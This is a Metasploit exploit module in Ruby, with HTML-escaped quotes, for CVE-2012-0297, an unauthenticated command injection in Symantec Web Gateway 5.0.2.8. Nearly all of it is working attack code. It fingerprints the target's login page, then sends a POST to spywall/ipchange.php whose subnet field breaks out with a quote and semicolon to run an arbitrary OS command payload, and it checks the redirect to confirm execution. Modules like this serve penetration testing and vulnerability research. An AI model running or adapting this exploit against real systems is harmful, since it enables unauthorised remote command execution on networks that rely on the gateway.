# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = ExcellentRanking
 
    include Msf::Exploit::Remote::HttpClient
 
    def initialize(info={})
        super(update_info(info,
            &#039;Name&#039;           => "Symantec Web Gateway 5.0.2.8 ipchange.php Command Injection",
            &#039;Description&#039;    => %q{
                    This module exploits a command injection vulnerability found in Symantec Web
                Gateway&#039;s HTTP service due to the insecure usage of the exec() function. This module
                abuses the spywall/ipchange.php file to execute arbitrary OS commands without
                authentication.
            },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Author&#039;         =>
                [
                    &#039;Tenable Network Security&#039;, # Vulnerability Discovery
                    &#039;juan vazquez&#039; # Metasploit module
                ],
            &#039;References&#039;     =>
                [
                    [ &#039;CVE&#039;, &#039;2012-0297&#039; ],
                    [ &#039;BID&#039;, &#039;53444&#039; ],
                    [ &#039;URL&#039;, &#039;http://www.zerodayinitiative.com/advisories/ZDI-12-090&#039; ],
                    [ &#039;URL&#039;, &#039;http://www.symantec.com/security_response/securityupdates/detail.jsp?fid=security_advisory&pvid=security_advisory&year=2012&suid=20120517_00&#039; ]
                ],
            &#039;Payload&#039;        =>
                {
                    &#039;BadChars&#039; => "\x00\x0d\x0a\x26",
                    &#039;Compat&#039;      =>
                        {
                            &#039;PayloadType&#039; => &#039;cmd&#039;,
                            &#039;RequiredCmd&#039; => &#039;generic perl&#039;,
                        }
                },
            &#039;Platform&#039;       => [&#039;unix&#039;],
            &#039;Arch&#039;           => ARCH_CMD,
            &#039;Targets&#039;        =>
                [
                    [&#039;Symantec Web Gateway 5.0.2.8&#039;, {}],
                ],
            &#039;Privileged&#039;     => false,
            &#039;DisclosureDate&#039; => "May 17 2012",
            &#039;DefaultTarget&#039;  => 0))
    end
 
 
    def check
        res = send_request_raw({
            &#039;method&#039; => &#039;GET&#039;,
            &#039;uri&#039;    => &#039;/spywall/login.php&#039;
        })
 
        if res and res.body =~ /\<title\>Symantec Web Gateway\<\/title\>/
            return Exploit::CheckCode::Detected
        else
            return Exploit::CheckCode::Safe
        end
    end
 
    def exploit
        uri = target_uri.path
        uri << &#039;/&#039; if uri[-1,1] != &#039;/&#039;
 
        peer = "#{rhost}:#{rport}"
 
        post_data = "subnet="
        post_data << "\";" + payload.raw + ";#"
 
        print_status("#{peer} - Sending Command injection")
        res = send_request_cgi({
            &#039;method&#039; => &#039;POST&#039;,
            &#039;uri&#039;    => "#{uri}spywall/ipchange.php",
            &#039;data&#039;   => post_data
        })
 
        # If the server doesn&#039;t return the default redirection, probably
        # something is wrong
        if not res or res.code != 302 or res.headers[&#039;Location&#039;] !~ /SW\/admin_config.php/
            print_error("#{peer} - Probably command not executed, aborting!")
            return
        end
 
    end
 
 
end



